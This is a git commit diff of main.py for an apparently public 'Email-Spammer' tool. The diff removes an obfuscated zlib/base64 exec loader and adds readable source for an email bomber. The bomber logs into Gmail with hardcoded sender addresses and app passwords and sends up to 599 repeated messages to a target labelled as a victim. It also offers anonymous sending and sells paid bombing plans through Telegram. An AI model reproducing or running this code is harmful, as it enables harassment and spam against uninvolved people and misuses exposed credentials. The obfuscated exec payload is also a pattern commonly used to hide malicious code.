a773957a2589702d4262395ebacea142da4167cd
He1Zen <68460974+mishakorzik@users.noreply.github.com>
2026-09-10 22:22:17 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,270 @@
-import zlib, base64
-exec(zlib.decompress(base64.b64decode('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')))
+R = '\033[31m'
+G = '\033[32m'
+C = '\033[36m'
+W = '\033[0m'
+
+import time, os, random, sys, json, argparse, requests, smtplib, time
+import subprocess as subp
+import logging
+
+logger = logging.getLogger('dev')
+logger.setLevel(logging.INFO)
+
+fileHandler = logging.FileHandler('spammer.log')
+fileHandler.setLevel(logging.INFO)
+
+consoleHandler = logging.StreamHandler()
+consoleHandler.setLevel(logging.INFO)
+
+logger.addHandler(fileHandler)
+logger.addHandler(consoleHandler)
+
+logger.info('Email Spammer - Started!')
+row = []
+info = ''
+result = ''
+systemR = '1.7.4'
+
+def update_check():
+    get = requests.get("https://raw.githubusercontent.com/mishakorzik/Email-Spammer/main/src/.version").text
+    get = get.replace("\n", "")
+    if get == systemR:
+        print(f"\033[0mINFO: \033[92mno update found.")
+    else:
+        print(f"\033[0mINFO: \033[91mnew version found, please update tool from\n\033[0mINFO: \033[91mgithub.com/mishakorzik/Email-Spammer")
+
+def exit_error():
+    print(bcolors.FAIL + 'Works only with Gmail.')
+    sys.exit()
+
+def cls():
+        if sys.platform == 'win32':
+                # clear in windows, java
+                os.system('cls')
+        else:
+                # clear in linux, android, ubuntu
+                os.system('clear')
+
+# gmail   : port = 587 , smtp_server = smtp.gmail.com
+# outlook : port = 465 , smtp_server = smtp-mail.outlook.com
+# yahoo   : port = 587 , smtp_server = smpt.mail.yahoo.com
+# hotmail : port = 587 , smtp_server = smtp-mail.outlook.com
+# Yandex  : port = 465 , smtp_server = smtp.yandex.com
+# MailRu  : port = 587 , smtp_server = smtp.mail.ru
+
+GMAIL_PORT = "587"
+GMAIL_SSL_PORT = "465"
+YAHOO_PORT = "587"
+OUTLOOK_PORT = "587"
+AOL_PORT = "587"
+MAILRU_PORT = "465"
+
+cls()
+
+class bcolors:
+        OKGREEN = '\033[92m'
+        WARNING = '\033[0;33m'
+        FAIL = '\033[91m'
+        ENDC = '\033[0m'
+        LITBU = '\033[94m'
+        YELLOW = '\033[3;33m'
+        CYAN = '\033[0;36'
+        colors = ['\033[92m', '\033[91m', '\033[0;33m']
+        RAND = random.choice(colors)
+
+class FG:
+        black = "\033[30m"
+        red = "\033[31m"
+        green = "\033[32m"
+        orange = "\033[33m"
+        blue = "\033[34m"
+        purple = "\033[35m"
+        cyan = "\033[36m"
+        lightgrey = "\033[37m"
+        darkgrey = "\033[90m"
+        lightred = "\033[91m"
+        lightgreen = "\033[92m"
+        yellow = "\033[93m"
+        lightblue = "\033[94m"
+        pink = "\033[95m"
+        lightcyan = "\033[96m"
+
+
+def start_bomb():
+        cls()
+        print(bcolors.OKGREEN + '''
+[>] Prepare for spam and attack ...''')
+
+print(f"\033[0mWARN: \033[0;33myou are using the free version. Buy full version TG: @ubp2q")
+print(f"\033[0mWARN: \033[0;33msending a message to email is supported only in English language.")
+update_check()
+print(bcolors.RAND + '''
+
+▓█████  ███▄ ▄███▓ ▄▄▄       ██▓  ██▓      ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
+▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒ ▓██▒    ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
+▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒ ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
+▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░ ▒██░      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██
+░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░ ░██████▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
+░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░  ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
+ ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░  ░ ▒  ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
+   ░   ░      ░     ░   ▒    ▒ ░  ░  ░   ░  ░  ░  ░░         ░   ▒   ░      ░
+   ░  ░       ░         ░  ░ ░       ░  ░      ░                 ░  ░       ░
+           .::.: EmailSpammer v1.7.4  Developer: misha korzhik :.::.''')
+
+print(bcolors.WARNING + '''                                                                               
+\033[95m[1] Gmail    -  powered google
+[2] Anon E.  -  powered google
+[3] Buy VIP  -  buy full version
+[4] Exit     -  log out utility         ''')
+
+try:
+        server = input(bcolors.WARNING + 'Select option: ' + bcolors.ENDC)
+        if server == '4' or server == '04' or server == 'exit' or server == 'Exit' or server == 'quit' or server == 'Quit':
+                print(bcolors.FAIL + 'Exiting utility ...' + bcolors.ENDC)
+                sys.exit()
+        elif server == '1' or server == '01' or server == 'gmail' or server == 'Gmail':
+                print('01. fire.send482@gmail.com')
+                print('02. auto.send583@gmail.com')
+                print(bcolors.WARNING + 'example: auto.send583@gmail.com' + bcolors.ENDC)
+                user = input(bcolors.WARNING + 'Select email: ' + bcolors.ENDC)
+                to = input(bcolors.LITBU + 'Sent To (жертва): ' + bcolors.ENDC)
+                subject = input(bcolors.LITBU + 'Subject (заголовок): ' + bcolors.ENDC)
+                body = input(bcolors.LITBU + 'Message (сообщение): ' + bcolors.ENDC)
+                delay = input(bcolors.OKGREEN + 'Speed of sending letters (1-5): ' + bcolors.ENDC)
+                nomes = int(input(bcolors.OKGREEN + 'Number of Emails to send (1-99): ' + bcolors.ENDC))
+                logger.info('Email: '+user)
+                logger.info('Target email: '+to)
+                logger.info('Email list to send: '+str(nomes))
+                en0 = 600
+                if en0 <= nomes:
+                        cls()
+                        print(bcolors.FAIL + 'denied access: Error \nsending maximum number 599')
+                        time.sleep(2)
+                        os.execl(sys.executable, sys.executable, *sys.argv)
+        elif server == '2' or server == '02' or server == 'anon' or server == 'Anon':
+                print('01. jiki.mioli08@gmail.com')
+                print(bcolors.WARNING + 'example: jiki.mioli08@gmail.com' + bcolors.ENDC)
+                user = input(bcolors.WARNING + 'Select email: ' + bcolors.ENDC)
+                to = input(bcolors.LITBU + 'Sent To (кому): ' + bcolors.ENDC)
+                subject = input(bcolors.LITBU + 'Subject (заголовок): ' + bcolors.ENDC)
+                body = input(bcolors.LITBU + 'Message (сообщение): ' + bcolors.ENDC)
+                delay = '1'
+                logger.info('One Email: '+user)
+                logger.info('Target email: '+to)
+                logger.info('Email list to send: Its a anonymous message! nomes: 0')
+                delay_name = 'special'
+        elif server == '3' or server == '03' or server == 'buy' or server == 'Buy':
+                print("15$ (USD) - 50 emails per 12th. For 1 week")
+                print("30$ (USD) - 100 emails per 12th. For 1 week")
+                print("50$ (USD) - 200 emails per 12th. For 1 week")
+                print("85$ (USD) - 400 emails per 12th. For 1 week")
+                print("")
+                print("if you want to buy, write to Telegram: @ubp2q")
+                exit()
+        no = 0
+        if to == 'misakorzik528@gmail.com' or to == 'miguardzecurity@gmail.com' or to == 'korzikmisha@gmail.com':
+                print(bcolors.FAIL + '\nWhat?  seems to have failed to process \nyour request, please try another email.' + bcolors.ENDC)
+                sys.exit(0)
+        if delay == '1' or delay == '01':
+                SPEED = .1
+                delay_name = 'fast'
+        elif delay == '2' or delay == '02':
+                SPEED = .3
+                delay_name = 'medium'
+        elif delay == '3' or delay == '03':
+                SPEED = .5
+                delay_name = 'slow'
+        elif delay == '4' or delay == '04':
+                SPEED = .7
+                delay_name = 'unhurried'
+        elif delay == '5' or delay == '05':
+                SPEED = .9
+                delay_name = 'snail'
+        else:
+                SPEED = .3
+                delay_name = 'default'
+
+        message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
+except KeyboardInterrupt:
+        print(bcolors.FAIL + 'Canceled! Quiting ...' + bcolors.ENDC)
+        sys.exit()
+
+
+#Gmail powered google
+if server == '1' or server == '01' or server == 'gmail' or server == 'Gmail':
+        if user == "fire.send482@gmail.com":
+            pwd = "dpusbvnihmvncaob"
+        elif user == "auto.send583@gmail.com":
+            pwd = "awlgkpsurszifppt"
+        start_bomb()
+        print(bcolors.WARNING + 'Email: ' + user + '  Target: ' + to + '  Speed: ' + delay_name)
+        print("")
+        server = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
+        print(bcolors.WARNING + 'Starting TLS - server0.starttls()')
+        server.starttls()
+        try:
+                print(bcolors.WARNING + 'Connecting - server0.login(u, p)')
+                server.login(user, pwd)
+        except smtplib.SMTPAuthenticationError:
+                try:
+                        print(bcolors.WARNING + 'Reconnecting - server0.login(u, p)')
+                        server.login(user, pwd)
+                except smtplib.SMTPAuthenticationError:
+                        try:
+                                print(bcolors.WARNING + 'Reconnecting - server0.login(u, p)')
+                                server.login(user, pwd)
+                        except smtplib.SMTPAuthenticationError:
+                                print(bcolors.WARNING + 'Error to connect! Please use a mini version, select option 5...')
+                                sys.exit()
+        for i in range(1, nomes+1):
+                logger.info('Done! Spaming...')
+                try:
+                        server.sendmail(user, to, message)
+                        print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
+                        no += 1
+                        time.sleep(SPEED)
+                except KeyboardInterrupt:
+                        print(bcolors.FAIL + '\nTerminaling...' + bcolors.ENDC)
+                        sys.exit()
+                except:
+                        server.sendmail(user, to, message)
+                        print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
+                        no += 1
+                        time.sleep(SPEED)
+        server.close()
+        print(bcolors.FAIL + 'Proccess Terminated! restart program ..?')
+        op = input(bcolors.FAIL + 'Do you want to continue (Y/n): ')
+        if op == 'y' or op == 'Y' or op == 'Yes' or op == 'yes':
+                os.execl(sys.executable, sys.executable, *sys.argv)
+
+elif server == '2' or server == '02' or server == 'anon' or server == 'Anon':
+        if user == "jiki.mioli08@gmail.com":
+            pwd = "gzwjsohldzxdpteh"
+        start_bomb()
+        print(bcolors.WARNING + 'Email: ' + user + '  Send To: ' + to)
+        print("")
+        server = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
+        server.starttls()
+        try:
+                server.login(user, pwd)
+        except smtplib.SMTPAuthenticationError:
+                sys.exit()
+        for i in range(1):
+                logger.info('Done! Anonymous message...')
+                try:
+                        server.sendmail(user, to, message)
+                        print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
+                        no += 1
+                        time.sleep(SPEED)
+                except KeyboardInterrupt:
+                        print(bcolors.FAIL + '\nTerminaling...' + bcolors.ENDC)
+                        sys.exit()
+                except:
+                        print(bcolors.FAIL + "Messange failed to Send! ")
+        server.close()
+        print(bcolors.FAIL + 'Proccess Terminated! restart program ..?')
+        op = input(bcolors.FAIL + 'Do you want to continue (Y/n): ')
+        if op == 'y' or op == 'Y' or op == 'Yes' or op == 'yes':
+                os.execl(sys.executable, sys.executable, *sys.argv)
+else:
+    exit_error()
